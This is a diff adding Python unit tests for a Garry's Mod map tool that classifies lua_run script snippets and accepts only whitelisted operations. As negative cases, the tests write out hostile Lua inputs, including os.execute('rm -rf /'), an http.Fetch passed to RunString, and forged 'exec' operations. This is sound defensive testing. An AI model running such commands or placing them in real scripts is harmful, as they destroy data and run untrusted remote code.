@@ -658,6 +658,56 @@ class PropDoorSwing(unittest.TestCase):
         self.assertTrue(self.rec(spawnflags=8193)["start_open"])
 
 
+class LuaRun(unittest.TestCase):
+    SPEED = "for i, ply in pairs(player.GetAll()) do if (ply:IsValid()) then ply:SetRunSpeed( 185 ) end end"
+    RESET = "for k,v in pairs (player.GetAll()) do v:Kill() end timer.Simple(.25, function() game.CleanUpMap(false)  end)"
+
+    def test_templates_translate_to_whitelisted_operations(self):
+        from dotbsp import scripts
+        st, ops, _ = scripts.classify(self.SPEED)
+        self.assertEqual((st, ops), ("translated", [{"op": "set_player_speed", "kind": "run", "value": 185.0}]))
+        st, ops, _ = scripts.classify(self.SPEED.replace("Run", "Walk").replace("185", "120"))
+        self.assertEqual(ops[0]["kind"], "walk")
+        st, ops, _ = scripts.classify(self.RESET)
+        self.assertEqual([o["op"] for o in ops], ["kill_players", "cleanup_map"])
+        self.assertEqual(ops[1]["delay"], 0.25)
+        self.assertTrue(all(scripts.valid_op(o) for o in ops))
+
+    def test_hostile_and_near_miss_snippets_are_never_translated(self):
+        from dotbsp import scripts
+        for code in (self.SPEED + " os.execute('rm -rf /')", "os.execute('x') " + self.SPEED,
+                     self.SPEED.replace("185", "99999"), self.SPEED.replace("ply:SetRunSpeed( 185 )", "RunConsoleCommand('quit')"),
+                     self.RESET + " http.Fetch('http://x', RunString)", "RunString(file.Read('x'))", "", "x = 1",
+                     self.SPEED + "\n" + self.SPEED):
+            st, ops, _ = scripts.classify(code)
+            self.assertEqual((st, ops), ("unhandled", []), code)
+
+    def test_valid_op_refuses_forged_operations(self):
+        from dotbsp import scripts
+        for op in ({"op": "exec", "cmd": "x"}, {"op": "set_player_speed", "kind": "run"}, {"op": "set_player_speed", "kind": "fly", "value": 5},
+                   {"op": "set_player_speed", "kind": "run", "value": True}, {"op": "kill_players", "x": 1}, "kill_players"):
+            self.assertFalse(scripts.valid_op(op), op)
+
+    def test_analyse_and_annotate_a_document(self):
+        from dotbsp import scripts
+        def ent(i, cls, tn, pairs=(), outs=()):
+            return {"index": i, "classname": cls, "targetname": tn, "parentname": "", "pairs": [list(p) for p in pairs], "outputs": list(outs)}
+        ents = [ent(0, "lua_run", "speed", [("code", self.SPEED)]), ent(1, "lua_run", "evil", [("code", "os.execute('x')")]),
+                ent(2, "func_button", "b", [], [{"output": "OnPressed", "target": "speed", "input": "RunCode", "param": "", "delay": 0, "times": -1},
+                                                {"output": "OnPressed", "target": "evil", "input": "RunPassedCode", "param": "Foo:Bar()", "delay": 0, "times": -1}])]
+        rows = scripts.annotate(ents)
+        self.assertEqual([(r["source"], r["status"]) for r in rows], [("code", "translated"), ("code", "unhandled"), ("RunPassedCode", "unhandled")])
+        self.assertEqual(rows[0]["fired_by"], 1)
+        self.assertEqual(ents[0]["script"]["status"], "translated")
+        self.assertEqual(ents[1]["script"]["ops"], [])
+        self.assertNotIn("script", ents[2])
+        class Raw(dict):
+            pairs = [("classname", "lua_run"), ("targetname", "s"), ("code", self.SPEED)]
+        raw = Raw(classname="lua_run", targetname="s")
+        self.assertEqual(scripts.analyse([raw])[0]["status"], "translated")
+        self.assertEqual(scripts.shape("WMI.SetWMIOut('w','input3a','Switch State',0)"), scripts.shape("WMI.SetWMIOut('w','input1b','Back Switch State',2)"))
+
+
 @unittest.skipUnless(os.environ.get("DOTBSP_TEST_MAPS"), "set DOTBSP_TEST_MAPS to a folder of real maps")
 class RealMaps(unittest.TestCase):
     def test_each(self):
